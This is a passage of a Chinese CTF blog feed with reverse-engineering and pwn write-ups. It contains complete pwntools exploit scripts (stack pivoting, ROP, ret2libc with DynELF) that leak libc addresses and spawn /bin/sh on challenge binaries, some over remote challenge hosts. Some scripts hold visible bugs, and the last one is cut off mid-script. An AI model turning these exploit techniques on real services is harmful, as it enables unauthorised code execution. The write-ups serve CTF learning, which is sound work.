class="hljs-string">'='</span>)<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    flag = raw_input(<span class="hljs-string">'please input flag to check:'</span>)    <span class="hljs-keyword">if</span> rep(base64.b64encode(rail(caser(flag)))) == <span class="hljs-string">'ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi'</span>:        <span class="hljs-keyword">print</span> <span class="hljs-string">'Success!you got it!'</span>        <span class="hljs-keyword">break</span>        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">print</span> <span class="hljs-string">'try a gain'</span></code></pre></div><p>逻辑挺简单的，直接拿着这个代码改下：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> string<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">caser</span><span class="hljs-params">(flag)</span>:</span>    enc1 = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:        enc1 += chr(ord(i) + <span class="hljs-number">5</span>)        <span class="hljs-keyword">return</span> enc1<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rail</span><span class="hljs-params">(flag)</span>:</span>    p1 = <span class="hljs-string">''</span>    p2 = <span class="hljs-string">''</span>    p3 = <span class="hljs-string">''</span>    enc2 = <span class="hljs-string">''</span>    j = <span class="hljs-number">0</span>    x = <span class="hljs-number">25</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(x):        j = i + <span class="hljs-number">13</span>        z = j + <span class="hljs-number">13</span>        p3 += flag[i] + flag[j]         <span class="hljs-keyword">if</span> z &gt;= <span class="hljs-number">38</span> :            <span class="hljs-keyword">break</span>        p3 += flag[z]        enc2 = p1 + p2 + p3    <span class="hljs-keyword">return</span> enc2<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rep</span><span class="hljs-params">(flag)</span>:</span>    table1 = <span class="hljs-string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span>    table2 = <span class="hljs-string">'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'</span>    table = string.maketrans(table1, table2)    <span class="hljs-keyword">return</span> flag.translate(table, <span class="hljs-string">'='</span>)key = <span class="hljs-string">'ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi'</span>flag = rail(caser(base64.b64decode(rep(key) + <span class="hljs-string">'='</span>)))print(flag)</code></pre></div><h2 id="maze1"><a href="#maze1" class="headerlink" title="maze1"></a>maze1</h2><p>一个简单的maze问题，不过是c++写的，ida反编译看起来有点难读。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/03LBOC.png" srcset="/img/loading.gif" alt><br>从这里确定下地图，后面的2就是终点。去内存中取出来地图：<br><img src="http://qiqianyun.chumen77.xyz/uPic/x7t4PS.png" srcset="/img/loading.gif" alt><br>去ida继续分析：<br><img src="http://qiqianyun.chumen77.xyz/uPic/S2wojN.png" srcset="/img/loading.gif" alt><br>发现你输入的字符串需要等于10，如果不是直接就失败，长度等于10才继续判断。awsd还是这几个字符控制方向。再联系一下前面的地图，终点是2，只能走10步，猜一波dddddsssss。<br><img src="http://qiqianyun.chumen77.xyz/uPic/3qNEI0.png" srcset="/img/loading.gif" alt><br>就是这个，flag就是去md5加密一下出来的字符串。</p>]]></content>
    
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录i春秋新春公益赛的两个题</title>
    <link href="/2020/02/25/%E8%AE%B0%E5%BD%95i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%A2%98/"/>
    <url>/2020/02/25/%E8%AE%B0%E5%BD%95i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="记录i春秋新春公益赛的两个题"><a href="#记录i春秋新春公益赛的两个题" class="headerlink" title="记录i春秋新春公益赛的两个题"></a>记录i春秋新春公益赛的两个题</h1><h2 id="吃鸡神器"><a href="#吃鸡神器" class="headerlink" title="吃鸡神器"></a>吃鸡神器</h2><p>这个题目是比赛时没做，因为有一段时间没做re题目了，下来看到这个题做出的人不算少，就去尝试做一做。<br>源程序是qt写的，以前听室友说过qt的程序ida是静态分析不了的，函数调用太多了，就直接动态分析。这个题目应该是有多线程od打开直接是黑屏的，左下角显示新建了一个线程，第一次做这种题也比较没有头绪。折腾了一会发现用的<strong>x64dbg</strong>可以调试了。</p><h3 id="x64dbg调试"><a href="#x64dbg调试" class="headerlink" title="x64dbg调试"></a>x64dbg调试</h3><p>一直运行程序等代码跑到0x40开头的段，进入login 的模块。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aQ0jsg.png" srcset="/img/loading.gif" alt><br>找下字符串：<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/AL01Oy.png" srcset="/img/loading.gif" alt><br>在这里下个断点。因为登陆失败会跳转输出这个字符串的函数，看看能不能查看出是从哪里跳转过来的然后在密码判断那里来继续分析。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Ior8oA.png" srcset="/img/loading.gif" alt><br>看到已经跳转过来了，但是发现附近没有什么判断的地方，去根据那个从哪里跳转过来，追过去看到登陆成功调用welcome的函数，但是也没有发现什么可以利用的那里的判断不是要找的密码判断。<br>换个思路，还是跳转到失败那里，但是在<strong>上层函数</strong>的栈中，因为存在判断登陆的用户跟密码，应该会存在我们输入的东西，寻找一下密码跟用户名。<br><img src="http://qiqianyun.chumen77.xyz/uPic/ExvIk2.png" srcset="/img/loading.gif" alt><br>找到了，给用户名对应的地址下一个硬件断点，来看看哪里会访问这里，只要访问了基本距离要找的函数差不远了。其中第二个字符对应处，经测试不应该下断点。一直让其F9运行，等到了用户0x40段代码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/guzN1A.png" srcset="/img/loading.gif" alt><br>发现这段是在一个个字符处理<strong>lubenwei</strong>字符串，还有<code>ret</code>，这样基本就是了。ret以后到：<br><img src="http://qiqianyun.chumen77.xyz/uPic/nTZ8tn.png" srcset="/img/loading.gif" alt><br>注意此处的汇编语句，并看下寄存器情况：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bua46M.png" srcset="/img/loading.gif" alt><br>刚刚走过call函数，下面且有cmp对比语句，并且发现了输入的密码<code>12345678</code>，十分可疑了。<br>在这几处函数下断点，重新点击login验证进行分析，发现的确断在了下的这几个函数，结合寄存器查看发现，输入的密码跟走过<code>0x004021D3</code>这个函数后传过来的eax进行对比。并且一对比以后就进入了，提示登陆失败的地方。所以这个eax就是用户的密码了。<br>测试以后发现是小写的<code>eax  41D26F00</code> ：41d26f00,输入密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/psY0ix.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r3WZrp.png" srcset="/img/loading.gif" alt><br>Ok,成功了。</p><h2 id="borrowstack"><a href="#borrowstack" class="headerlink" title="borrowstack"></a>borrowstack</h2><p>这个题目名字就是borrowshack 接栈。含义就是转移栈，正好最近刚学过，就动手去做了，结果卡了很久，但也学到很多，此前练习的栈迁移题目没有这题的情况。</p><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><div class="hljs"><pre><code class="hljs objc">[*] '/media/psf/mypwn2/xcgys/borrowstack'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre></div><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-60h]</span>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0L</span>L);  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0L</span>L);  <span class="hljs-built_in">puts</span>(&amp;s);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x70</span>uLL);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!You can check and use your borrow stack now!"</span>);  read(<span class="hljs-number">0</span>, &amp;bank, <span class="hljs-number">0x100</span>uLL);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>代码是很简单的，bank的地址在bss段，以后留着做栈迁移就可以了 。溢出地址还是只可以控制ebp，跟retadress。接下来就是自己学到的了，自己手动调试了一段时间才发现的。</p><h4 id="坑点（学到的新东西）"><a href="#坑点（学到的新东西）" class="headerlink" title="坑点（学到的新东西）"></a>坑点（学到的新东西）</h4><p>先说下这个程序的情况：<br>bank 的地址 <code>.bss:0000000000601080</code><br><img src="http://qiqianyun.chumen77.xyz/uPic/Q3hjpz.png" srcset="/img/loading.gif" alt><br>注意看下bss段里got段的距离，一共是40个字节，是比较近的。如果按我以前的做法直接迁移到bank这地址做新栈，当栈迁移过去以后，使用puts函数来泄露某个函数got对应的地址时，会发现当调用puts以后，会进入libc中开始一连串的函数调用：第一个<br><img src="http://qiqianyun.chumen77.xyz/uPic/2Zk09z.png" srcset="/img/loading.gif" alt><br>发现还没有push，此时rsp就是bank的地址了，push过后肯定栈指针开始慢慢变小，往bss段上方延伸。<br>当调用第二个函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/v02DA7.png" srcset="/img/loading.gif" alt><br>发现已经到了bss上方的got表段，这样毫无疑问，里面的值就会改动了，程序接下来发生什么是很难预测的，并且个人也拿不到原本的got地址，从而算出libc基地址。并且会发现，当以往回到start处清理栈想再次利用漏洞的时候，也是不行了，也是因为不知道什么数据被改动，造成了影响。</p><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><p>就是把栈迁移到bss段的尽量靠后，这样就会尽量不影响到got表和原本正常的数据。返回地址不再是自己常常用的start处，换成其他合适的地方。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timecontext.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./borrowstack'</span>)<span class="hljs-comment"># io = remote('123.56.85.29',3635)</span>elf = ELF(<span class="hljs-string">'./borrowstack'</span>)<span class="hljs-comment"># libc = elf.libc</span>leave_addr = <span class="hljs-number">0x0400699</span>offset = <span class="hljs-number">200</span>buf_addr = <span class="hljs-number">0x000601080</span>padding = <span class="hljs-number">0x60</span>start_addr = <span class="hljs-number">0x0400626</span>p = <span class="hljs-string">'\x00'</span>* padding + p64(buf_addr+offset) + p64(leave_addr)pop_rsi_rx_ret = <span class="hljs-number">0x400701</span> io.recvuntil(<span class="hljs-string">'want\n'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.send(p)io.recvuntil(<span class="hljs-string">'stack now!\n'</span>)libc_start_main =  elf.got[<span class="hljs-string">'__libc_start_main'</span>]puts_plt = elf.symbols[<span class="hljs-string">'puts'</span>]puts_got = elf.got[<span class="hljs-string">'puts'</span>]pop_rdi_ret = <span class="hljs-number">0x400703</span>read_got = elf.got[<span class="hljs-string">'read'</span>]p = flat([<span class="hljs-string">'b'</span>*offset,(buf_addr+offset),pop_rdi_ret,puts_got,puts_plt,start_addr])raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(p)puts_add = u64((io.recv(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))print(hex(puts_add))obj = LibcSearcher(<span class="hljs-string">'puts'</span>,puts_add)libc_base = puts_add - obj.dump(<span class="hljs-string">'puts'</span>)print(hex(libc_base))sleep(<span class="hljs-number">0.1</span>)rec = libc_base + <span class="hljs-number">0x4526a</span>system_addr = libc_base + libc_basebinsh_addr = libc_base + libc_baseprint(hex(system_addr))print(hex(binsh_addr))io.recvline()io.recvuntil(<span class="hljs-string">'want\n'</span>)p = <span class="hljs-string">'\x00'</span>* padding + p64(<span class="hljs-number">1</span>) + p64(rec)io.send(p)io.interactive()</code></pre></div><h3 id="结论和收获"><a href="#结论和收获" class="headerlink" title="结论和收获"></a>结论和收获</h3><p>结论：当栈迁移到bss段以后，由于libc函数的调用，此时栈慢慢增高，bss段以上的数据也可能会被改动。<br>收获：当再遇到栈迁移问题的时候，要注意bss段与got的距离，返回地址写入start地址，发现出现问题的时候，就该提升栈迁移的地址高度，和找个合适的返回位置，再次利用漏洞。</p>]]></content>
    
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XCTF\_pwn新手</title>
    <link href="/2020/02/17/XCTF_pwn%E6%96%B0%E6%89%8B/"/>
    <url>/2020/02/17/XCTF_pwn%E6%96%B0%E6%89%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="XCTF-pwn新手"><a href="#XCTF-pwn新手" class="headerlink" title="XCTF_pwn新手"></a>XCTF_pwn新手</h1><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><div class="hljs"><pre><code class="hljs objc">Arch:     i386<span class="hljs-number">-32</span>-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (<span class="hljs-number">0x8048000</span>)</code></pre></div><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/17/XCTF_pwn新手/images/15819436335898.jpg" srcset="/img/loading.gif" alt="-w605"><br>漏洞就在这s处，gets可以无限读取，导致栈溢出。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>第一个fgets获取时候，读取一个<code>/bin/sh\x00</code>进去，因为name的地址是固定的。</li><li>get函数获取时候，padding + system_plt +name地址即可。</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span><span class="hljs-comment"># io = process('./cgpwn2')</span>io = remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">40540</span>)elf = ELF(<span class="hljs-string">'./cgpwn2'</span>)io.recvuntil(<span class="hljs-string">'name\n'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(<span class="hljs-string">'/bin/sh\x00'</span>)system_plt = elf.symbols[<span class="hljs-string">'system'</span>]padding = <span class="hljs-number">0x26</span> + <span class="hljs-number">4</span>binsh_add = <span class="hljs-number">0x0804A080</span>payload = padding * <span class="hljs-string">'a'</span> + p32(system_plt) + p32(<span class="hljs-number">0x0804A080</span>) + p32(binsh_add)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用DynElf模块完成获取libc信息</title>
    <link href="/2020/02/15/%E5%88%A9%E7%94%A8DynElf%E6%A8%A1%E5%9D%97%E5%AE%8C%E6%88%90%E8%8E%B7%E5%8F%96libc%E4%BF%A1%E6%81%AF/"/>
    <url>/2020/02/15/%E5%88%A9%E7%94%A8DynElf%E6%A8%A1%E5%9D%97%E5%AE%8C%E6%88%90%E8%8E%B7%E5%8F%96libc%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="利用DynElf模块完成获取libc信息"><a href="#利用DynElf模块完成获取libc信息" class="headerlink" title="利用DynElf模块完成获取libc信息"></a>利用DynElf模块完成获取libc信息</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下另一种没有libc，完成漏洞利用的办法，学完后自我感觉这个办法已经比较落后了，没有libcseacher好用，也用起来比它难的多了。针对于libcseacher不能做的题，用这种办法，否则还是libcseacher好用。</p><h2 id="Dynelf"><a href="#Dynelf" class="headerlink" title="Dynelf"></a>Dynelf</h2><p>解析加载的、动态链接的ELF⼆进制⽂件中的符号。给定⼀个可以在任意地址泄漏数据的函数，任何加载的 库中的任何符号都可以被解析。（官方文档解释）</p><h3 id="基本使用框架："><a href="#基本使用框架：" class="headerlink" title="基本使用框架："></a>基本使用框架：</h3><div class="hljs"><pre><code>io = remote(ip, port)def leak(addr):    payload = &quot;xxxxxxxx&quot; + addr + &quot;xxxxxxxx&quot;    io.send(payload)    data = io.recv()    #debug用的    print(&quot;%x -&gt; %s&quot; %(addr, (data or &apos;&apos;).encode(&apos;hex&apos;)))    return data#初始化DynELF模块 d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)system_addr = d.lookup(“system”, &apos;libc&apos;)</code></pre></div><p>其中第2个参数，可以不传。进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，addr就是leak函数要泄漏信息的所在地址。<strong>正是这个addr的参数的存在，才让Dynelf函数在内存中到处的leak以及对比是否是我们寻找的sympols</strong>。</p><p>且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几 个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等。</p><h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</p><ul><li>目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；</li><li>目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</li></ul><p>以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</p><h3 id="使用write函数来泄露"><a href="#使用write函数来泄露" class="headerlink" title="使用write函数来泄露"></a>使用write函数来泄露</h3><p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。</p><p>其输出完全由其参数len决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响。因此leak函数中对数据的读取和处理较为简单。但是其一个不好的地方，就是需要传递3个参数，在面对64位程序的时候，其中rdx这个寄存器是比较难处理的。就不得不用万能gadget了。</p><h4 id="万能gadget"><a href="#万能gadget" class="headerlink" title="万能gadget"></a>万能gadget</h4><p><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817628590359.jpg" srcset="/img/loading.gif" alt="-w817"><br>这个是libc_init函数的汇编，这个函数是一定要调用的，并且可以控制rdi,rsi,rdx,所以能称的上万能gadget。对于使用这段gadget，首先在初识函数的ret处填入如图所指的<code>pop rbx</code>的地址，然后看下栈如何来布置：<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817631112375.jpg" srcset="/img/loading.gif" alt="-w486"><br>（其中为什么填入got地址，是因为接下来ret到<code>mov rdx,r13</code>后面的call qword ptr[r12+rbx*8] 其是call这个地址的。）<br>在第一段pop 后ret地址要填入<code>mov rdx,r13</code>的地址，然后再慢慢执行，当执行完成call以后，流程还会回到这一段<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817633402017.jpg" srcset="/img/loading.gif" alt="-w259"><br>所以我们为了再次利用最后那个retn，ret到自己想去的地方，要在栈上摆好7*8=56个字节。接下来练习关于write两个题目。</p><h4 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013 ropasaurusrex"></a>PlaidCTF 2013 ropasaurusrex</h4><h5 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><div class="hljs"><pre><code>Arch:     i386-32-little RELRO:    No RELRO Stack:    No canary found NX:       NX enabled PIE:      No PIE (0x8048000)</code></pre></div><h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><div class="hljs"><pre><code>ssize_t sub_80483F4(){  char buf; // [esp+10h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre></div><p>函数十分简单，溢出在这个位置。并且plt里面有write函数，然后就用它来泄露。</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code>from pwn import *io = process(&apos;./ropasaurusrex&apos;)elf = ELF(&apos;./ropasaurusrex&apos;)buf = 0x8049620padding = 140write_add = elf.symbols[&apos;write&apos;]start_addr = 0x08048340def leak(addr):    p = &apos;&apos;    p += padding * &apos;a&apos;    p += p32(write_add)    p += p32(start_addr)    p += p32(1)    p += p32(addr)    p += p32(0x4)    io.sendline(p)    content = io.recv(4)    # print(&quot;%x -&gt; %s&quot; %(addr, (content or &apos;&apos;).encode(&apos;hex&apos;)))    return contentd = DynELF(leak,elf=elf)system_add = d.lookup(&apos;system&apos;,&apos;libc&apos;)read_add = d.lookup(&apos;read&apos;,&apos;libc&apos;)log.info(&quot;system_add = %x&quot;, system_add)log.info(&quot;read_add = %x&quot;, read_add)p = padding * &apos;a&apos; + p32(read_add) + p32(system_add) + p32(0) + p32(buf) + p32(8)io.sendline(p)io.sendline(&apos;/bin/sh\x00&apos;)io.interactive()</code></pre></div><h4 id="Jarvis-oj-leave4"><a href="#Jarvis-oj-leave4" class="headerlink" title="Jarvis_oj_leave4"></a>Jarvis_oj_leave4</h4><h5 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><div class="hljs"><pre><code>[*] &apos;/media/psf/mypwn2/jarvis_OJ/level4/level4&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre></div><h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817716059093.jpg" srcset="/img/loading.gif" alt="-w420"></p><div class="hljs"><pre><code>ssize_t vulnerable_function(){  char buf; // [esp+0h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre></div><p>漏洞函数，存在栈溢出。还是跟上题一样的思路。</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code>from pwn import *import time# context.log_level = &apos;debug&apos;context.arch = &apos;i386&apos;# io = process(&apos;./level4&apos;)io = remote(&apos;pwn2.jarvisoj.com&apos;,9880)elf = ELF(&apos;./level4&apos;)__libc_start_main_got = elf.got[&apos;__libc_start_main&apos;]write_plt = elf.symbols[&apos;write&apos;]start_addr = 0x08048350padding = 140def leak(addr):    payload = padding * &apos;a&apos; + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) +p32(0x4)    io.sendline(payload)    data = io.recv(4)    print(&quot;%x -&gt; %s&quot; %(addr, (data or &apos;&apos;).encode(&apos;hex&apos;)))    return datad = DynELF(leak,elf = elf)system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)info(&apos;system_addr = %#x&apos; %system_addr)read_addr = d.lookup(&apos;read&apos;,&apos;libc&apos;)info(&apos;read_addr = %#x&apos; %read_addr)binsh_add = 0x804A01Cpayload = padding * &apos;a&apos; + p32(read_addr) + p32(system_addr) + p32(0) + p32(binsh_add) + p32(8)io.sendline(payload)sleep(0.1)io.sendline(&apos;/bin/sh\x00&apos;)io.interactive()</code></pre></div><h3 id="使用puts函数来泄露"><a href="#使用puts函数来泄露" class="headerlink" title="使用puts函数来泄露"></a>使用puts函数来泄露</h3><p>printf, puts这类函数的特点是会被特殊字符影响，puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，<strong>puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点</strong>，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</p><h4 id="针对缺点的改进办法"><a href="#针对缺点的改进办法" class="headerlink" title="针对缺点的改进办法"></a>针对缺点的改进办法</h4><h5 id="puts输出完后就没有其他输出"><a href="#puts输出完后就没有其他输出" class="headerlink" title="puts输出完后就没有其他输出"></a>puts输出完后就没有其他输出</h5><p>leak函数模板<br>    def leak(address):<br>      count = 0<br>      content = ‘’<br>      payload = xxx<br>      p.send(payload)<br>      print p.recvuntil(‘xxxn’) #一定要在puts前释放完输出<br>      up = “”<br>      while True:<br>        c = p.recv(numb=1, timeout=0.1)<br>        count += 1<br>        if up == ‘\n’ and c == “”:  #接收到的上一个字符为回车符，而当前接收不到新字符，则<br>         content += content[:-1]  +’\x00’            #删除puts函数输出的末尾回车符<br>          break<br>        else:<br>          content += c<br>        up = c<br>      content = content[:4]  #取指定字节数<br>      log.info(“%#x =&gt; %s” % (address, (content or ‘’).encode(‘hex’)))<br>      return content<br>其中<code>c = p.recv(numb=1, timeout=0.1)</code>由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待0.1秒钟，如果确实接收不到了，就说明输出结束了。以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</p><h5 id="puts输出完后还有其他输出"><a href="#puts输出完后还有其他输出" class="headerlink" title="puts输出完后还有其他输出"></a>puts输出完后还有其他输出</h5><div class="hljs"><pre><code>def leak(address):  count = 0  content = &quot;&quot;  payload = xxx  p.send(payload)  print p.recvuntil(&quot;xxxn&quot;)) #一定要在puts前释放完输出  up = &quot;&quot;  while True:    c = p.recv(1)    count += 1    if up == &apos;\n&apos; and c == &quot;x&quot;:  #一定要找到泄漏信息的字符串特征      content = content[:-1] + &quot;x00&quot;                        break    else:      content += c    up = c  content = content[:4]   log.info(&quot;%#x =&gt; %s&quot; % (address, (content or &apos;&apos;).encode(&apos;hex&apos;)))  return content</code></pre></div><h4 id="Lctf-2016-pwn100"><a href="#Lctf-2016-pwn100" class="headerlink" title="Lctf_2016_pwn100"></a>Lctf_2016_pwn100</h4><h5 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><div class="hljs"><pre><code>[*] &apos;/media/psf/mypwn2/ichunqiu/0x05/LCTF 2016-pwn100/pwn100&apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre></div><h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><div class="hljs"><pre><code>int sub_40068E(){  char v1; // [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;v1, 200);  return puts(&quot;bye~&quot;);}__int64 __fastcall sub_40063D(__int64 a1, signed int a2){  __int64 result; // rax  signed int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; ; ++i )  {    result = (unsigned int)i;    if ( i &gt;= a2 )      break;    read(0, (void *)(i + a1), 1uLL);  }  return result;}</code></pre></div><p>主要的漏洞函数在这两个。这二个函数结合起来引起栈溢出，第二个函数还对读入数据做了处理，我们要保证送过去200的个自己，注意要用send发。</p><ol><li>因为其有puts函数，这次就用puts函数来进行leak。等leak出来以后，返回start清理栈，再用dynelf找出system，和read函数的地址。</li><li>第二次构造rop链的时候，用read函数读<code>system(/bin/sh)</code>到一个确定的地址，还是会到start处。</li><li>第三次构造时候，直接进行调用system函数的rop链即可。</li></ol><p>其中对于read这个函数，rdx这个参数就得用万能gadget来控制了。<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817725422726.jpg" srcset="/img/loading.gif" alt="-w820"></p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code>#coding:utf-8from pwn import *context.arch = &apos;amd64&apos;# context.log_level = &apos;info&apos;io = process(&apos;./pwn100&apos;)elf = ELF(&apos;./pwn100&apos;)# libc = elf.libcpadding = 72puts_plt = elf.plt[&apos;puts&apos;]read_got = elf.got[&apos;read&apos;]start_add = 0x000400550pop_rdi = 0x400763def leak(addr):    payload = padding * &apos;a&apos; + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_add)#flat[(pop_rdi,addr,puts_plt,start_add)]    payload = payload.ljust(200,&apos;b&apos;)    io.send(payload)    count = 0    up = &apos;&apos;    content = &apos;&apos;    io.recvuntil(&apos;bye~\n&apos;) #一定要在puts前释放完输出    while True:        c = io.recv(numb=1, timeout=0.1)        count += 1        if up == &apos;\n&apos; and c == &quot;&quot;:  